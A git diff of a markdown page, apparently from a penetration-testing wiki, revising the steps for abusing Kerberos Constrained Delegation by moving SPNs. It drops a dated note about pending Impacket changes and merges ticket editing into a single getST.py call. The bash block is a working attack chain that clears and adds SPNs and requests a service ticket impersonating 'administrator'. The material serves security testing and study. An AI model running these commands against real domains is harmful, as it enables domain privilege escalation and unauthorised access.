@@ -34,11 +34,6 @@ On top of all that, if attacker is able to move a "listed SPN" from the original
 
 From UNIX-like machines, [krbrelayx](https://github.com/dirkjanm/krbrelayx)'s [addspn.py](https://github.com/dirkjanm/krbrelayx/blob/master/addspn.py) and [Impacket](https://github.com/SecureAuthCorp/impacket) example scripts (Python) can be used to conduct the different steps (manipulate SPNs, obtain and manipulate tickets).
 
-> [!NOTE]
-> _At the time of writing, 12th Feb. 2022,_ [_the pull request_](https://github.com/SecureAuthCorp/impacket/pull/1256) _adding the `tgssub.py` is pending._ [_The pull request_](https://github.com/SecureAuthCorp/impacket/pull/1184) _modifying the `findDelegation.py` is pending._
-> 
-> _At the time of writing, 12th Feb. 2022, this technique has not been fully fool-proofed from UNIX systems. In case something errors, switch to the Windows technique._
-
 ```bash
 # 1. show SPNs listed in the KCD configuration
 findDelegation.py -user 'serverA$' "$DOMAIN"/"$USER":"$PASSWORD"
@@ -47,13 +42,10 @@ findDelegation.py -user 'serverA$' "$DOMAIN"/"$USER":"$PASSWORD"
 addspn.py --clear -t 'ServerB$' -u "$DOMAIN"/"$USER" -p "$PASSWORD" 'DomainController.domain.local'
 
 # 3. add SPN to serverC
-addspn.py -t 'ServerC$' --spn "cifs/serverB" -u "$DOMAIN"/"$USER" -p "$PASSWORD" -c 'DomainController.domain.local'
+addspn.py -t 'ServerC$' --spn "cifs/serverB" -u "$DOMAIN"/"$USER" -p "$PASSWORD" 'DomainController.domain.local'
 
 # 4. request an impersonating service ticket for the SPN through S4U2self + S4U2proxy
-getST -spn "cifs/serverB" -impersonate "administrator" 'domain/serverA$:$PASSWORD'
-
-# 5. Edit the ticket's SPN (service class and/or hostname)
-tgssub.py -in serverB.ccache -out newticket.ccache -altservice "cifs/serverC"
+getST.py -spn "cifs/serverB" -impersonate "administrator" "$DOMAIN/serverA$:$PASSWORD" -altservice "cifs/serverC"
 ```
 
 Once the final service ticket is obtained, it can be used with [Pass the Cache](ptc.md) / [Pass the Ticket](ptt.md) to access the target.
